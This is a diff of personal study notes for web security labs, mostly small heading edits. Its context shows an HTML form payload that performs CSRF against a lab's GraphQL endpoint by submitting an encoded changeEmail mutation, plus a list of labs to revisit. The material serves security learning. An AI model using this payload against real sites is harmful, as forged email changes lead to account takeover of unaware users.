@@ -1,4 +1,4 @@
-**Performing CSRF exploits over GraphQL:**
+**Performing CSRF exploits over GraphQL**
 ```
     <form action="https://{lab}/graphql/v1" method="POST">
       <input type="hidden" name="query" value="mutation&#32;changeEmail&#40;&#36;input&#58;&#32;ChangeEmailInput&#33;&#41;&#123;changeEmail&#40;input&#58;&#32;&#36;input&#41;&#123;email&#125;&#125;" />
@@ -17,11 +17,11 @@
 
 
 
-### Return to these labs:
+### Return to these labs
 - SameSite Strict bypass via sibling domain
   - Uses cross-site WebSocket hijacking
 - Rest of the clickjacking labs
 
 
-### Fix in notes:
-- GraphQL - 
+### Fix in notes
+- GraphQL - Github markdown issue with double curly braces
